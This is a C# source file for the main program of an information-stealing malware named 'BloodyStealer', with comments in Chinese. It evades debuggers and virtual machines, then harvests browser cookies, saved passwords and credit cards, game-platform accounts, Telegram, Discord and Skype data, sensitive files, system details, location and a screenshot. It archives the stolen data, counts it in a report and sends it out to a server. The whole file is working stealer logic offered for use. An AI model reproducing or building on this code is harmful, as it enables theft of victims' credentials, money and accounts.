using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;

namespace BloodyStealer
{
    /// <summary>
    /// BloodyStealer的主程序类
    /// 整合了所有偷窃模块并执行完整的数据收集和发送流程
    /// </summary>
    internal class MainProgram
    {
        /// <summary>
        /// 程序入口点
        /// </summary>
        public static void Main(string[] args)
        {
            try
            {
                // 检查环境 - 如果检测到调试器或虚拟机，则退出
                if (Settings.EnableAntiAnalysis && (AntiAnalysis.CheckVirtualMachine() || AntiAnalysis.CheckDebuggers()))
                {
                    return;
                }

                // 初始化设置
                Settings.Initialize();

                // 收集所有数据
                List<FileObject> allData = CollectAllData();

                // 创建一个报告文件，包含基本系统信息和统计数据
                FileObject reportFile = CreateReportFile();
                allData.Add(reportFile);

                // 压缩数据
                byte[] archiveData = ArchiveHelper.CreateArchive(allData);

                // 发送数据到服务器
                if (archiveData.Length > 0)
                {
                    string fileName = $"{Settings.Id}_{DateTime.Now:yyyyMMdd_HHmmss}.zip";
                    string caption = $"血腥窃贼 - {Settings.Id}";
                    DataSender.SendData(archiveData, fileName, caption);
                }
            }
            catch (Exception ex)
            {
                // 在生产环境中，通常会忽略错误以避免程序崩溃
                // 在实际情况中，可能会将错误记录到文件中
            }
        }

        /// <summary>
        /// 收集所有可窃取的数据
        /// </summary>
        /// <returns>包含所有窃取数据的文件对象列表</returns>
        private static List<FileObject> CollectAllData()
        {
            List<FileObject> allData = new List<FileObject>();

            try
            {
                // 收集浏览器数据
                List<FileObject> browserData = BrowserStealer.CollectAllBrowserData();
                if (browserData != null && browserData.Count > 0)
                {
                    allData.AddRange(browserData);
                }
            }
            catch
            {
                // 忽略错误，继续下一步
            }

            try
            {
                // 收集游戏数据
                List<FileObject> gameData = GameStealer.CollectAllGameData();
                if (gameData != null && gameData.Count > 0)
                {
                    allData.AddRange(gameData);
                }
            }
            catch
            {
                // 忽略错误，继续下一步
            }

            try
            {
                // 收集即时通讯工具数据
                List<FileObject> messengerData = MessengerStealer.CollectAllMessengerData();
                if (messengerData != null && messengerData.Count > 0)
                {
                    allData.AddRange(messengerData);
                }
            }
            catch
            {
                // 忽略错误，继续下一步
            }

            try
            {
                // 收集敏感文件
                List<FileObject> sensitiveFiles = FileStealer.CollectSensitiveFiles();
                if (sensitiveFiles != null && sensitiveFiles.Count > 0)
                {
                    allData.AddRange(sensitiveFiles);
                }
            }
            catch
            {
                // 忽略错误，继续下一步
            }

            // 收集系统信息
            try
            {
                // 获取系统详情
                string systemDetails = SystemInfo.GetSystemDetails();
                byte[] systemDetailsBytes = Encoding.UTF8.GetBytes(systemDetails);
                allData.Add(new FileObject
                {
                    Name = "系统信息.txt",
                    Content = systemDetailsBytes
                });

                // 获取地理位置信息
                GeoInfo geoInfo = SystemInfo.GetGeoInfo();
                string geoInfoText = $"IP地址: {geoInfo.IPAddress}\r\n国家: {geoInfo.CountryCode}";
                byte[] geoInfoBytes = Encoding.UTF8.GetBytes(geoInfoText);
                allData.Add(new FileObject
                {
                    Name = "地理位置.txt",
                    Content = geoInfoBytes
                });

                // 获取屏幕截图
                byte[] screenshotData = SystemInfo.CaptureScreenshot();
                if (screenshotData.Length > 0)
                {
                    allData.Add(new FileObject
                    {
                        Name = "屏幕截图.png",
                        Content = screenshotData
                    });
                }
            }
            catch
            {
                // 忽略错误，继续下一步
            }

            return allData;
        }

        /// <summary>
        /// 创建报告文件，包含基本统计信息
        /// </summary>
        /// <returns>报告文件对象</returns>
        private static FileObject CreateReportFile()
        {
            StringBuilder report = new StringBuilder();
            report.AppendLine($"=== 血腥窃贼报告 ===");
            report.AppendLine($"生成时间: {DateTime.Now}");
            report.AppendLine($"客户端ID: {Settings.Id}");
            report.AppendLine($"用户名: {SystemInfo.GetUserName()}");
            report.AppendLine();
            
            report.AppendLine($"=== 统计信息 ===");
            report.AppendLine($"Chrome Cookies: {BrowserStealer.ChromeCookiesCount}");
            report.AppendLine($"Chrome 密码: {BrowserStealer.ChromePasswordsCount}");
            report.AppendLine($"Chrome 信用卡: {BrowserStealer.ChromeCreditCardsCount}");
            report.AppendLine($"Firefox Cookies: {BrowserStealer.FirefoxCookiesCount}");
            report.AppendLine($"Firefox 密码: {BrowserStealer.FirefoxPasswordsCount}");
            report.AppendLine();
            
            report.AppendLine($"Steam 账户: {GameStealer.SteamCount}");
            report.AppendLine($"Epic Games 账户: {GameStealer.EpicGamesCount}");
            report.AppendLine($"Origin 账户: {GameStealer.OriginCount}");
            report.AppendLine($"Uplay 账户: {GameStealer.UplayCount}");
            report.AppendLine($"GOG 账户: {GameStealer.GOGCount}");
            report.AppendLine($"Bethesda 账户: {GameStealer.BethesdaCount}");
            report.AppendLine($"VimeWorld 账户: {GameStealer.VimeWorldCount}");
            report.AppendLine();
            
            report.AppendLine($"Telegram 数据: {MessengerStealer.TelegramCount}");
            report.AppendLine($"Discord 数据: {MessengerStealer.DiscordCount}");
            report.AppendLine($"Skype 数据: {MessengerStealer.SkypeCount}");
            report.AppendLine();
            
            report.AppendLine($"敏感文件: {FileStealer.FileCount}");
            report.AppendLine($"uTorrent 数据: {FileStealer.UTorrentCount}");
            
            // 转换为文件对象
            return new FileObject
            {
                Name = "报告.txt",
                Content = Encoding.UTF8.GetBytes(report.ToString())
            };
        }
    }
} 